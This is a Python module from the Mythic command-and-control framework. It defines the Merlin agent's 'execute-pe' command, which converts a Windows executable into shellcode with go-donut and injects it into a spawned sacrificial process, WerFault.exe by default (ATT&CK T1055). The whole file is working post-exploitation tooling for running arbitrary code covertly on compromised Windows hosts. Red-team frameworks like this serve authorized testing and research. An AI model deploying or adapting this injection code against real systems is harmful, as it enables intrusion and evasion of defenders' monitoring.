
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import os
import json
import subprocess

# Set to enable debug output to Mythic
debug = False


class ExecutePEArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "executable": CommandParameter(
                name="executable",
                type=ParameterType.File,
                description="The Windows executable (PE file) you want to run",
                ui_position=0,
                required=True,
            ),
            "arguments": CommandParameter(
                name="executable arguments",
                type=ParameterType.String,
                description="Arguments to execute the assembly with",
                ui_position=1,
                required=False,
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute the PE in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                ui_position=2,
                required=True
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="Argument to create the spawnto process with, if any",
                ui_position=3,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)


class ExecutePECommand(CommandBase):
    cmd = "execute-pe"
    needs_admin = False
    help_cmd = "execute-pe"
    description = "Convert a Windows PE into shellcode with Donut, " \
                  "execute it in the spawnto process, and return the output"
    version = 1
    author = "@Ne0nd0g"
    argument_class = ExecutePEArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        # Merlin jobs.MODULE
        task.args.add_arg("type", 16, ParameterType.Number)

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [
            donut(task.args.get_arg("executable"), task.args.get_arg("arguments")),
            task.args.get_arg("spawnto"),
            task.args.get_arg("spawntoargs")
        ]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.display_params = f'{json.loads(task.original_params)["executable"]} {task.args.get_arg("arguments")}\n ' \
                              f'spawnto: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("executable")
        task.args.remove_arg("arguments")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicRPC().execute("create_output", task_id=task.id, output=f'[DEBUG]Returned task:\r\n{task}\r\n')

        return task

    async def process_response(self, response: AgentResponse):
        pass


def donut(executable, arguments):
    donut_args = ['go-donut', '--in', 'input.exe', '--exit', '2']
    if arguments:
        donut_args.append('--params')
        donut_args.append(arguments)

    # Write file to location in container
    with open('input.exe', 'wb') as w:
        w.write(executable)

    result = subprocess.run(
        donut_args,
        stdout=subprocess.PIPE
    )

    donut_bytes = bytes
    # Read Donut output
    with open('loader.bin', 'rb') as output:
        donut_bytes = output.read()

    # Close files
    w.close()
    output.close()

    # Remove files
    os.remove("input.exe")
    os.remove("loader.bin")

    # Return Donut shellcode Base64 encoded
    return base64.b64encode(donut_bytes).decode("utf-8")

